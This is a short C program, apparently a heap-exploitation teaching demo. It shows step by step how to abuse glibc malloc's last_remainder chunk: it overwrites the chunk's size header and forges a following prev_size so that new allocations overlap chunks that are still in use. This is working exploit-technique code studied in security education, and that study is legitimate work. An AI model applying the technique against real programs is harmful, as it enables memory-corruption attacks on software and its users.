#include <stdio.h>
#include <stdlib.h>

#define CHUNK_SIZE0 0x080
#define CHUNK_SIZE1 0x5f0
#define CHUNK_SIZE2 0x700
#define CHUNK_SIZE3 0x010

void main() {
    long *start_chunk,
            *end_chunk,
            *chunk0,
            *chunk1,
            *chunk2,
            *reallocated_chunk0,
            *reallocated_chunk1,
            *reallocated_chunk2;


    // The goal this time, will be to reallocate heap chunks, without freeing them.
    // We will do this via leveraging the main_arena last_remainder.
    // The last remainder is the leftover of a chunk allocated from the all bin searching.

    // Once there is a last_remainder, we will expand its size via overwriting the chunk header size
    // The expanded size will include the other chunks
    // Then we will just allocate from it, to get the other allocated chunks

    // Let's start off with allocating our chunks

    start_chunk = malloc(CHUNK_SIZE1);
    chunk0 = malloc(CHUNK_SIZE0);
    chunk1 = malloc(CHUNK_SIZE0);
    chunk2 = malloc(CHUNK_SIZE0);
    end_chunk = malloc(CHUNK_SIZE0);

    // Then we will free the 0x600 byte chunk, to insert it into the unsorted bin

    free(start_chunk);

    // Next we will move the chunk over to the large bin

    malloc(CHUNK_SIZE2);

    // Now that it is in the large bin, we will allocate from it, and get a last reminder

    malloc(CHUNK_SIZE3);

    // Now we will expand the size of the last_remainder chunk

    start_chunk[3] = 0x7a1;
    start_chunk[2] = 0x000;

    // We will need a chunk_header with the same prev_size (and prev_inuse flag not set)
    // Right after the expanded chunk, to pass checks

    end_chunk[0] = 0x7a0;
    end_chunk[1] = 0x080;

    // Next we will allocate an amount, to lineup the last_remainder
    // with chunk0

    malloc(0x5d0);

    // Now we will reallocate chunk0
    reallocated_chunk0 = malloc(CHUNK_SIZE0);

    // Now we will reallocate chunk1
    reallocated_chunk1 = malloc(CHUNK_SIZE0);

    // Now we will reallocate chunk2
    reallocated_chunk2 = malloc(CHUNK_SIZE0);

    printf("Did we reallocate chunk0:\t%s\n", (chunk0 == reallocated_chunk0) ? "Yes" : "No");
    printf("Did we reallocate chunk1:\t%s\n", (chunk1 == reallocated_chunk1) ? "Yes" : "No");
    printf("Did we reallocate chunk2:\t%s\n", (chunk2 == reallocated_chunk2) ? "Yes" : "No");
}
